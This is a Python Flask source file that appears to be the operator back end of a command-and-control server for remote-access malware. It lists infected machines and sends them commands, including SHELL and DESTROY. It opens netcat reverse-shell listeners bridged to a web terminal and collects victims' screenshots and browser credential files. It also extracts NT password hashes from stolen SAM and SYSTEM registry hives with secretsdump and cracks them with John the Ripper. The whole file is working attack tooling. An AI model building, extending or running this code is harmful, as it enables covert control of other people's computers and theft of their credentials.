import os
import sys
import logging
import threading
import subprocess
import pty
import select
import time
from flask import Flask, jsonify, request, send_from_directory # type: ignore
from flask_cors import CORS # type: ignore
from flask_sock import Sock # type: ignore
from ssh_server import active_clients
from database import clients_table
import time

logging.basicConfig(filename='api.log', level=logging.INFO, 
                    format='%(asctime)s %(levelname)s: %(message)s')

app = Flask(__name__)
CORS(app)
sock = Sock(app)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
SCREENSHOTS_DIR = os.path.abspath(os.path.join(BASE_DIR, '..', '..', 'screenshots'))
CREDS_DIR = os.path.abspath(os.path.join(BASE_DIR, '..', '..', 'creds'))
CREDS_HASHES_DIR = os.path.join(CREDS_DIR, 'hashes')
CREDS_NAVIGATOR_DIR = os.path.join(CREDS_DIR, 'navigator')
os.makedirs(SCREENSHOTS_DIR, exist_ok=True)
os.makedirs(CREDS_DIR, exist_ok=True)
os.makedirs(CREDS_HASHES_DIR, exist_ok=True)
os.makedirs(CREDS_NAVIGATOR_DIR, exist_ok=True)

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

nc_processes = {}

@sock.route('/terminal/<int:port>')
def terminal_socket(ws, port):
    """Bridge between WebSocket and the netcat process via PTY."""
    print(f"[!] WebSocket Terminal connected for port {port}")
    
    master_fd, slave_fd = pty.openpty()
    
    proc = subprocess.Popen(
        ['nc', '-lvnp', str(port)],
        stdin=slave_fd,
        stdout=slave_fd,
        stderr=slave_fd,
        close_fds=True
    )
    nc_processes[port] = proc
    os.close(slave_fd)
    
    print(f"[!] nc -lvnp {port} started with PID {proc.pid}")

    def read_from_pty():
        """Reads data from PTY and sends it to the WebSocket."""
        try:
            while proc.poll() is None:
                rlist, _, _ = select.select([master_fd], [], [], 0.1)
                if master_fd in rlist:
                    try:
                        data = os.read(master_fd, 4096)
                        if data:
                            ws.send(data.decode(errors='replace'))
                    except OSError:
                        break
        except Exception as e:
            print(f"[!] PTY read error: {e}")

    read_thread = threading.Thread(target=read_from_pty, daemon=True)
    read_thread.start()

    try:
        while proc.poll() is None:
            try:
                data = ws.receive(timeout=0.1)
                if data:
                    os.write(master_fd, data.encode() if isinstance(data, str) else data)
            except Exception:
                pass
    except Exception as e:
        print(f"[!] WebSocket session ended: {e}")
    finally:
        print(f"[!] Terminal closed for port {port}")
        proc.terminate()
        os.close(master_fd)
        ws.close()

@app.route('/clients', methods=['GET'])
def list_clients():
    clients = list(clients_table.find())
    clients_with_status = []
    for client in clients:
        ip = client['ip']
        is_active = ip in active_clients
        is_destroyed = client.get('destroyed', False)
        clients_with_status.append({
            'ip': ip,
            'active': is_active,
            'destroyed': is_destroyed,
            'last_seen': client.get('last_seen', 'N/A')
        })
    return jsonify({"clients": clients_with_status})

@app.route('/clients/register', methods=['POST'])
def register_client():
    data = request.json
    client_ip = data.get('ip')
    last_seen = data.get('last_seen')
    is_reconnection = data.get('is_reconnection', False)
    
    client = clients_table.find_one({'ip': client_ip})
    if not client:
        clients_table.insert_one({
            'ip': client_ip,
            'last_seen': last_seen,
            'logs': [],
            'destroyed': False
        })
    else:
        was_destroyed = client.get('destroyed', False)
        if was_destroyed and is_reconnection:
            log_entry = {
                "type": "system",
                "content": f"[RECONNECTED] Agent reconnected after destruction - status reset",
                "timestamp": last_seen
            }
            clients_table.update_one(
                {'ip': client_ip}, 
                {
                    '$set': {'last_seen': last_seen, 'destroyed': False},
                    '$push': {'logs': log_entry}
                }
            )
            print(f"[API] Client {client_ip} reconnected after destruction - status reset")
        else:
            update_data = {'$set': {'last_seen': last_seen}}
            if was_destroyed and not is_reconnection:
                update_data['$set']['destroyed'] = True
            clients_table.update_one(
                {'ip': client_ip}, 
                update_data
            )
    return jsonify({"status": "success"})

@app.route('/clients/<string:client_ip>/logs/add', methods=['POST'])
def add_log(client_ip):
    data = request.json
    log_entry = data.get('log')
    
    client = clients_table.find_one({'ip': client_ip})
    if client:
        clients_table.update_one({'ip': client_ip}, {'$push': {'logs': log_entry}})
        return jsonify({"status": "success"})
    return jsonify({"error": "Client not found"}), 404

@app.route('/clients/<string:client_ip>/logs/update_pending', methods=['POST'])
def update_pending_log(client_ip):
    data = request.json
    instruction = data.get('instruction')
    result = data.get('result')
    
    client = clients_table.find_one({'ip': client_ip})
    if client:
        logs = client.get('logs', [])
        updated = False
        for log in reversed(logs):
            if log.get('type') == 'command' and log.get('instruction') == instruction and log.get('result') is None:
                log['result'] = result
                updated = True
                break
        
        if updated:
            if instruction and instruction.upper() == 'DESTROY':
                clients_table.update_one(
                    {'ip': client_ip}, 
                    {'$set': {'logs': logs, 'destroyed': True}}
                )
            else:
                clients_table.update_one({'ip': client_ip}, {'$set': {'logs': logs}})
            return jsonify({"status": "success"})
            
        return jsonify({"error": "No pending command found"}), 404
    return jsonify({"error": "Client not found"}), 404

@app.route('/clients/<string:client_ip>/send', methods=['POST'])
def send_command(client_ip):
    cmd = request.json.get('command')
    print(f"\n[API] Command received for {client_ip}: {cmd}")
    
    if client_ip in active_clients:
        session = active_clients[client_ip]
        
        client = clients_table.find_one({'ip': client_ip})
        if client:
            log_entry = {
                "type": "command",
                "instruction": cmd,
                "result": None,
                "timestamp": os.popen('date "+%Y-%m-%d %H:%M:%S"').read().strip()
            }
            clients_table.update_one({'ip': client_ip}, {'$push': {'logs': log_entry}})
            
            if cmd.upper().startswith("SHELL"):
                session.handle_reverse_shell_instruction(cmd)

            session.last_command = cmd
            try:
                session._chan.write(cmd + '\n')
                print(f"[API] Command sent to agent: {cmd}")
            except Exception as e:
                print(f"[API] Error sending command: {e}")
                return jsonify({"error": f"Send error: {e}"}), 500
            
            return jsonify({"status": "sent"})
    
    print(f"[API] Client {client_ip} not found in active_clients: {list(active_clients.keys())}")
    return jsonify({"error": "Client not found or disconnected"}), 404

@app.route('/clients/<string:client_ip>/logs', methods=['GET'])
def get_logs(client_ip):
    client = clients_table.find_one({'ip': client_ip})
    if not client:
        return jsonify({"error": "Client not found"}), 404
    
    logs = client.get('logs', [])
    formatted_logs = []
    for log in logs:
        log_type = log.get('type', 'output')
        timestamp = log.get('timestamp', '')
        
        if log_type == 'command':
            res = log.get('result') or 'Pending...'
            formatted_logs.append(f"$ > {log['instruction']} --- {res}")
        elif log_type == 'system':
            content = log.get('content', '')
            formatted_logs.append(f"[{timestamp}] {content}")
        else:
            formatted_logs.append(log.get('content', ''))

    return jsonify({"logs": "\n".join(formatted_logs)})

@app.route('/clients/<string:client_ip>/logs', methods=['DELETE'])
def clear_logs(client_ip):
    """Deletes all logs for a client."""
    client = clients_table.find_one({'ip': client_ip})
    if not client:
        return jsonify({"error": "Client not found"}), 404
    
    clients_table.update_one({'ip': client_ip}, {'$set': {'logs': []}})
    return jsonify({"status": "cleared"})

@app.route('/clients/<string:client_ip>/shell_port', methods=['GET'])
def get_shell_port(client_ip):
    """Returns the last active SHELL port (SHELL {port} instruction with SUCCESS result)."""
    client = clients_table.find_one({'ip': client_ip})
    if not client:
        return jsonify({"error": "Client not found"}), 404
    
    logs = client.get('logs', [])
    for log in reversed(logs):
        if log.get('type') == 'command':
            instruction = log.get('instruction', '')
            result = log.get('result', '')
            if instruction.upper().startswith('SHELL') and result and 'SUCCESS' in result.upper():
                parts = instruction.split()
                if len(parts) >= 2:
                    try:
                        port = int(parts[1])
                        return jsonify({"port": port})
                    except ValueError:
                        continue
    
    return jsonify({"error": "No active reverse shell found"}), 404


@app.route('/screenshots', methods=['GET'])
def list_screenshots():
    """Lists all available screenshots."""
    try:
        screenshots = []
        if os.path.exists(SCREENSHOTS_DIR):
            for filename in os.listdir(SCREENSHOTS_DIR):
                if filename.lower().endswith(('.png', '.bmp', '.jpg', '.jpeg')):
                    filepath = os.path.join(SCREENSHOTS_DIR, filename)
                    stat = os.stat(filepath)
                    screenshots.append({
                        'filename': filename,
                        'size': stat.st_size,
                        'created': stat.st_mtime
                    })
        
        screenshots.sort(key=lambda x: x['created'], reverse=True)
        return jsonify({"screenshots": screenshots, "count": len(screenshots)})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route('/screenshots/<string:filename>', methods=['GET'])
def get_screenshot(filename):
    """Returns a specific screenshot."""
    try:
        return send_from_directory(SCREENSHOTS_DIR, filename)
    except Exception as e:
        return jsonify({"error": str(e)}), 404


@app.route('/screenshots/<string:filename>', methods=['DELETE'])
def delete_screenshot(filename):
    """Deletes a screenshot."""
    try:
        filepath = os.path.join(SCREENSHOTS_DIR, filename)
        if os.path.exists(filepath):
            os.remove(filepath)
            return jsonify({"status": "deleted"})
        return jsonify({"error": "File not found"}), 404
    except Exception as e:
        return jsonify({"error": str(e)}), 500


def _device_ip_from_hash_filename(filename):
    """Extracts IP from hash filename (e.g., hashes_192_168_1_53.txt -> 192.168.1.53)."""
    if not filename.lower().endswith('.txt'):
        return None
    name = filename[:-4]
    if name.startswith('hashes_'):
        rest = name[7:]
    elif name.startswith('hash_'):
        rest = name[5:]
    else:
        return None
    parts = rest.split('_')
    if len(parts) >= 4:
        return '.'.join(parts[:4])
    return None


def _parse_hash_lines(text):
    """Extracts SAM lines (user:rid:lmhash:nthash:::) from raw text."""
    if not text:
        return []
    import re
    lines = [l.strip() for l in text.splitlines() if l.strip()]
    re_sam = re.compile(r'^[^:]+:\d+:[a-fA-F0-9]{32}:[a-fA-F0-9]{32}:::', re.MULTILINE)
    return [l for l in lines if re_sam.match(l)]


@app.route('/creds/check', methods=['POST'])
def check_hash_status():
    """
    Checks the status of a hash (already cracked or not) without launching the crack.
    JSON Request: { "hash": "<full SAM line user:RID:LM:NT:::" }
    """
    data = request.get_json(silent=True) or {}
    hash_value = (data.get('hash') or '').strip()
    if not hash_value:
        return jsonify({"error": "No hash provided"}), 400

    target_filename = None
    try:
        if os.path.exists(CREDS_HASHES_DIR):
            for filename in os.listdir(CREDS_HASHES_DIR):
                if not filename.lower().endswith('.txt'):
                    continue
                if not filename.startswith('hash_'):
                    continue
                filepath = os.path.join(CREDS_HASHES_DIR, filename)
                try:
                    with open(filepath, 'r', encoding='utf-8', errors='replace') as f:
                        first_line = f.readline().strip()
                    if first_line == hash_value:
                        target_filename = filename
                        break
                except OSError:
                    continue
        if not target_filename:
            return jsonify({"error": "No hash_*.txt file matches this hash"}), 404

        hash_path = os.path.join(CREDS_HASHES_DIR, target_filename)
        
        cmd_show = [
            'john',
            '--format=NT',
            '--show',
            hash_path,
        ]
        r_check = subprocess.run(
            cmd_show,
            capture_output=True,
            text=True,
            timeout=60,
            cwd=CREDS_HASHES_DIR,
        )
        cracked_check = (r_check.stdout or '').strip()
        password = None
        username = None
        
        if cracked_check and 'password hash cracked' in cracked_check:
            for line in cracked_check.splitlines():
                line = line.strip()
                if not line:
                    continue
                if 'password hash cracked' in line or 'hashes cracked' in line or 'left' in line:
                    continue
                parts = line.split(':')
                if len(parts) >= 2:
                    username = parts[0]
                    password = parts[1] if parts[1] else None
                    break

        return jsonify({
            "hash": hash_value,
            "hash_file": target_filename,
            "username": username,
            "password": password,
            "is_cracked": password is not None,
            "cracked": cracked_check,
        }), 200
    except Exception as e:
        logging.exception("creds/check")
        return jsonify({"error": str(e)}), 200


@app.route('/creds/crack', methods=['POST'])
def crack_hash():
    """
    Launches john on a specific hash.
    JSON Request: { "hash": "<full SAM line user:RID:LM:NT:::" }
    Checks first if the hash is already cracked before launching the crack.
    """
    data = request.get_json(silent=True) or {}
    hash_value = (data.get('hash') or '').strip()
    if not hash_value:
        return jsonify({"error": "No hash provided"}), 400

    target_filename = None
    try:
        if os.path.exists(CREDS_HASHES_DIR):
            for filename in os.listdir(CREDS_HASHES_DIR):
                if not filename.lower().endswith('.txt'):
                    continue
                if not filename.startswith('hash_'):
                    continue
                filepath = os.path.join(CREDS_HASHES_DIR, filename)
                try:
                    with open(filepath, 'r', encoding='utf-8', errors='replace') as f:
                        first_line = f.readline().strip()
                    if first_line == hash_value:
                        target_filename = filename
                        break
                except OSError:
                    continue
        if not target_filename:
            return jsonify({"error": "No hash_*.txt file matches this hash"}), 404

        hash_path = os.path.join(CREDS_HASHES_DIR, target_filename)
        rockyou_path = os.path.abspath(os.path.join(BASE_DIR, '..', '..', 'rockyou.txt'))
        if not os.path.isfile(rockyou_path):
            return jsonify({"error": "rockyou.txt not found on the server"}, 500)

        cmd_show = [
            'john',
            '--format=NT',
            '--show',
            hash_path,
        ]
        r_check = subprocess.run(
            cmd_show,
            capture_output=True,
            text=True,
            timeout=60,
            cwd=CREDS_HASHES_DIR,
        )
        cracked_check = (r_check.stdout or '').strip()
        already_cracked = False
        password = None
        username = None
        
        if cracked_check and 'password hash cracked' in cracked_check:
            already_cracked = True
            for line in cracked_check.splitlines():
                line = line.strip()
                if not line:
                    continue
                if 'password hash cracked' in line or 'hashes cracked' in line or 'left' in line:
                    continue
                parts = line.split(':')
                if len(parts) >= 2:
                    username = parts[0]
                    password = parts[1] if parts[1] else None
                    break
        
        out1 = ""
        err1 = ""
        returncode = 0
        if not already_cracked:
            cmd_crack = [
                'john',
                '--format=NT',
                '--wordlist', rockyou_path,
                '--rules',
                hash_path,
            ]
            r1 = subprocess.run(
                cmd_crack,
                capture_output=True,
                text=True,
                timeout=300,
                cwd=CREDS_HASHES_DIR,
            )
            out1 = (r1.stdout or '').strip()
            err1 = (r1.stderr or '').strip()
            returncode = r1.returncode
            
            r2 = subprocess.run(
                cmd_show,
                capture_output=True,
                text=True,
                timeout=60,
                cwd=CREDS_HASHES_DIR,
            )
            cracked_check = (r2.stdout or '').strip()
            
            if cracked_check and 'password hash cracked' in cracked_check:
                for line in cracked_check.splitlines():
                    line = line.strip()
                    if not line:
                        continue
                    if 'password hash cracked' in line or 'hashes cracked' in line or 'left' in line:
                        continue
                    parts = line.split(':')
                    if len(parts) >= 2:
                        username = parts[0]
                        password = parts[1] if parts[1] else None
                        break

        device_ip = _device_ip_from_hash_filename(target_filename) or 'unknown'
        if device_ip != 'unknown' and password:
            entry = {
                "hash": hash_value,
                "hash_file": target_filename,
                "username": username,
                "password": password,
                "cracked_raw": cracked_check,
                "cracked_at": int(time.time()),
                "tool": "john",
                "already_cracked": already_cracked,
            }
            existing = clients_table.find_one({'ip': device_ip})
            if existing:
                creds = existing.get('creds', [])
                hash_exists = any(c.get('hash') == hash_value for c in creds)
                if not hash_exists:
                    clients_table.update_one(
                        {'ip': device_ip},
                        {'$push': {'creds': entry}}
                    )
            else:
                clients_table.insert_one({
                    'ip': device_ip,
                    'last_seen': '',
                    'logs': [],
                    'creds': [entry],
                })

        return jsonify({
            "hash": hash_value,
            "hash_file": target_filename,
            "username": username,
            "password": password,
            "already_cracked": already_cracked,
            "stdout": out1,
            "stderr": err1,
            "cracked": cracked_check,
            "returncode": returncode,
            "status": "already_cracked" if already_cracked else ("cracked" if password else "not_cracked"),
        }), 200
    except subprocess.TimeoutExpired:
        return jsonify({"error": "john timeout"}, 200)
    except Exception as e:
        logging.exception("creds/crack")
        return jsonify({"error": str(e)}), 200


@app.route('/creds', methods=['GET'])
def list_creds():
    """Lists all .hive files (SYSTEM, SAM) grouped by device (IP)."""
    try:
        files = []
        if os.path.exists(CREDS_DIR):
            for filename in os.listdir(CREDS_DIR):
                if filename.lower().endswith('.hive'):
                    filepath = os.path.join(CREDS_DIR, filename)
                    stat = os.stat(filepath)
                    files.append({
                        'filename': filename,
                        'size': stat.st_size,
                        'created': stat.st_mtime
                    })
        files.sort(key=lambda x: x['created'], reverse=True)
        return jsonify({"creds": files, "count": len(files)})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route('/creds/hashes', methods=['GET'])
def list_creds_hashes():
    """Lists extracted hash files (creds/hashes/*.txt) with device_ip."""
    try:
        files = []
        if os.path.exists(CREDS_HASHES_DIR):
            for filename in os.listdir(CREDS_HASHES_DIR):
                if filename.lower().endswith('.txt'):
                    filepath = os.path.join(CREDS_HASHES_DIR, filename)
                    stat = os.stat(filepath)
                    device_ip = _device_ip_from_hash_filename(filename)
                    files.append({
                        'filename': filename,
                        'size': stat.st_size,
                        'created': stat.st_mtime,
                        'device_ip': device_ip or 'unknown',
                    })
        files.sort(key=lambda x: x['created'], reverse=True)
        return jsonify({"hashes": files, "count": len(files)})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route('/creds/hashes/<string:filename>/content', methods=['GET'])
def get_cred_hashes_file_content(filename):
    """Returns the content of a hash file as text (for display)."""
    try:
        if '..' in filename or not filename.lower().endswith('.txt'):
            return jsonify({"error": "Invalid filename"}), 400
        filepath = os.path.join(CREDS_HASHES_DIR, filename)
        if not os.path.isfile(filepath):
            return jsonify({"error": "File not found"}), 404
        with open(filepath, 'r', encoding='utf-8', errors='replace') as f:
            content = f.read()
        from flask import Response
        return Response(content, mimetype='text/plain; charset=utf-8')
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route('/creds/hashes/<string:filename>', methods=['GET'])
def get_cred_hashes_file(filename):
    """Downloads an extracted hash file (creds/hashes/*.txt)."""
    try:
        if '..' in filename or not filename.lower().endswith('.txt'):
            return jsonify({"error": "Invalid filename"}), 400
        return send_from_directory(CREDS_HASHES_DIR, filename, as_attachment=True, download_name=filename)
    except Exception as e:
        return jsonify({"error": str(e)}), 404


@app.route('/creds/<path:filename>', methods=['GET'])
def get_cred_file(filename):
    """Downloads a .hive file."""
    try:
        if '..' in filename or not filename.lower().endswith('.hive'):
            return jsonify({"error": "Invalid filename"}), 400
        return send_from_directory(CREDS_DIR, filename, as_attachment=True, download_name=filename)
    except Exception as e:
        return jsonify({"error": str(e)}), 404


@app.route('/creds/extract', methods=['POST'])
def extract_creds_hashes():
    """Extracts hashes using secretsdump.py -sam SAM.hive -system SYSTEM.hive LOCAL."""
    data = request.get_json(silent=True) or {}
    device_ip = data.get('device_ip', 'unknown')
    files = data.get('files') or []
    if not files:
        return jsonify({"error": "No .hive file provided"}), 400

    sam_file = None
    system_file = None
    for f in files:
        name = os.path.basename(f)
        if name.upper().startswith('SAM_') and name.lower().endswith('.hive'):
            sam_file = name
        elif name.upper().startswith('SYSTEM_') and name.lower().endswith('.hive'):
            system_file = name
    if not sam_file or not system_file:
        return jsonify({
            "error": "Exactly one SAM_*.hive and one SYSTEM_*.hive file are required.",
            "hashes": ""
        }), 400

    path_sam = os.path.join(CREDS_DIR, sam_file)
    path_system = os.path.join(CREDS_DIR, system_file)
    if not os.path.isfile(path_sam) or not os.path.isfile(path_system):
        return jsonify({"error": ".hive file not found in creds/", "hashes": ""}), 404

    cmd = [
        'secretsdump.py',
        '-sam', path_sam,
        '-system', path_system,
        'LOCAL'
    ]
    env = os.environ.copy()
    env['PYTHONUNBUFFERED'] = '1'
    logging.info("creds/extract: cmd=%s cwd=%s", cmd, CREDS_DIR)
    try:
        r = subprocess.run(
            cmd,
            capture_output=True,
            timeout=120,
            cwd=CREDS_DIR,
            env=env,
        )
        out = (r.stdout or b'').decode('utf-8', errors='replace').strip()
        err = (r.stderr or b'').decode('utf-8', errors='replace').strip()
        combined = (out + '\n' + err).strip() if (out or err) else (out or err or '')
        logging.info("creds/extract: returncode=%s len(stdout)=%s len(stderr)=%s", r.returncode, len(out), len(err))

        if r.returncode != 0:
            return jsonify({
                "error": "secretsdump failed (code %s)" % r.returncode,
                "hashes": combined or "(no output)"
            }), 200

        if not combined:
            return jsonify({
                "error": "secretsdump produced no output. Verify that impacket is installed and .hive files are valid.",
                "hashes": ""
            }), 200

        safe_ip = device_ip.replace('.', '_')
        hash_lines = _parse_hash_lines(combined)
        if not hash_lines:
            return jsonify({
                "hashes": combined,
                "stored": [],
                "device_ip": device_ip,
            }), 200

        if os.path.exists(CREDS_HASHES_DIR):
            for fn in os.listdir(CREDS_HASHES_DIR):
                if fn.endswith('.txt') and (fn.startswith('hash_' + safe_ip + '_') or fn == 'hashes_%s.txt' % safe_ip):
                    try:
                        os.remove(os.path.join(CREDS_HASHES_DIR, fn))
                    except OSError:
                        pass

        stored = []
        for i, line in enumerate(hash_lines, 1):
            store_filename = "hash_%s_%s.txt" % (safe_ip, i)
            store_path = os.path.join(CREDS_HASHES_DIR, store_filename)
            with open(store_path, 'w', encoding='utf-8') as f:
                f.write(line.strip() + '\n')
            stored.append(store_filename)
        logging.info("Hashes stored: %s files for %s", len(stored), device_ip)

        return jsonify({
            "hashes": combined,
            "stored": stored,
            "device_ip": device_ip,
        }), 200
    except subprocess.TimeoutExpired:
        return jsonify({"error": "Extraction timeout (120s)", "hashes": ""}), 200
    except FileNotFoundError:
        return jsonify({
            "error": "impacket not found. Install with: pip install impacket",
            "hashes": ""
        }), 200
    except Exception as e:
        logging.exception("extract_creds_hashes")
        return jsonify({"error": str(e), "hashes": ""}), 200


@app.route('/creds/navigator', methods=['GET'])
def list_creds_navigator():
    """Lists all navigator credentials JSON files."""
    try:
        files = []
        if os.path.exists(CREDS_NAVIGATOR_DIR):
            for filename in os.listdir(CREDS_NAVIGATOR_DIR):
                if filename.lower().endswith('.json'):
                    filepath = os.path.join(CREDS_NAVIGATOR_DIR, filename)
                    stat = os.stat(filepath)
                    parts = filename.replace('.json', '').split('_')
                    device_ip = None
                    timestamp = None
                    if len(parts) >= 3:
                        ip_parts = parts[1:-1]
                        device_ip = '.'.join(ip_parts)
                        timestamp = int(parts[-1]) if parts[-1].isdigit() else stat.st_mtime
                    else:
                        timestamp = stat.st_mtime
                    
                    files.append({
                        'filename': filename,
                        'device_ip': device_ip or 'unknown',
                        'timestamp': timestamp,
                        'size': stat.st_size,
                        'created': stat.st_mtime
                    })
        files.sort(key=lambda x: (x['device_ip'], -(x['timestamp'] or 0)))
        return jsonify({"navigator": files, "count": len(files)})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route('/creds/navigator/<string:filename>', methods=['GET'])
def get_cred_navigator_file(filename):
    """Returns the content of a navigator credentials JSON file."""
    try:
        if '..' in filename or not filename.lower().endswith('.json'):
            return jsonify({"error": "Invalid filename"}), 400
        filepath = os.path.join(CREDS_NAVIGATOR_DIR, filename)
        if not os.path.exists(filepath):
            return jsonify({"error": "File not found"}), 404
        
        import json
        with open(filepath, 'r', encoding='utf-8') as f:
            data = json.load(f)
        return jsonify(data)
    except Exception as e:
        return jsonify({"error": str(e)}), 500
